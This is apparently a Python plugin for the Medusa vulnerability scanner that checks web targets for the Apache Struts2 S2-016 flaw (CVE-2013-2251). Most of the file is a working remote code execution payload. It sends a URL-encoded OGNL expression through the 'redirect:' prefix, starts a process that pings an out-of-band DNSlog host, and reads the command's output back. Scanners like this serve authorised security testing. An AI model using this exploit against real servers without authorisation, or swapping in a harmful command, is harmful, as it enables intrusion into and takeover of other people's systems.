#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Ascotbe'
from ClassCongregation import VulnerabilityDetails,ErrorLog,WriteFile,ErrorHandling,Proxies,Dnslog
import urllib3
import requests
import time
import urllib.parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="CVE-2013-2251" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date']  = "2020-3-14"  # 插件编辑时间
        self.info['disclosure']='2013-7-9'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "Struts2RemoteCodeExecutionVulnerability16"  # 插件名称
        self.info['name'] ='Struts2远程代码执行漏洞16' #漏洞名称
        self.info['affects'] = "Struts2"  # 漏洞组件
        self.info['desc_content'] = "DefaultActionMapper类支持以action:，redirect:和redirectAction:作为访问前缀，前缀后面可以跟OGNL表达式，由于Struts2未对其进行过滤，导致任意Action可以使用这些前缀执行任意OGNL表达式，从而导致任意命令执行，经测试发现redirect:和redirectAction:这两个前缀比较好容易构造出命令执行的"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "删除“action:”，”redirect:”，”redirectAction:”这些前置前缀调用"  # 修复建议
        self.info['version'] = "Struts2.0.0-Struts2.3.15"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

class UrlProcessing:  # URL处理函数
    def result(self, url):
        if url.startswith("http"):  # 判断是否有http头，如果没有就在下面加入
            res = urllib.parse.urlparse(url)
        else:
            res = urllib.parse.urlparse('http://%s' % url)
        return res.scheme, res.hostname, res.port,res.path

def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=Proxies().result(proxies)

    scheme, url, port,path = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    DL=Dnslog()
    con=""
    payload="""?redirect:%24%7B%23a%3D%28new%20java.lang.ProcessBuilder%28new%20java.lang.String%5B%5D%7B%27ping%27%2c%27{}%27%7D%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B500%5D%2C%23d.read%28%23e%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23d.read%28%23e%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23d.read%28%23e%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23d.read%28%23e%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23d.read%28%23e%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D""".format(DL.dns_host())
    try:
        payload_url = scheme + "://" + url +":"+ str(port)+path+payload
        headers = {
            'User-Agent': RandomAgent,
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
        }

        try:#防止在linux系统上执行了POC，导致超时扫描不到漏洞
            resp = requests.get(payload_url,headers=headers, timeout=6,proxies=proxies, verify=False)
            con = resp.text
        except:
            pass

        time.sleep(2)
        if DL.result():
            Medusa = "{} 存在Struts2远程代码执行漏洞(S2-016)\r\n漏洞详情:\r\n版本号:S2-016\r\n使用EXP:{}\r\n返回数据:{}\r\n返回DNSLOG数据:{}\r\n使用DNSLOG:{}\r\n".format(url,payload_url,con,DL.dns_text(),DL.dns_host())
            _t=VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类
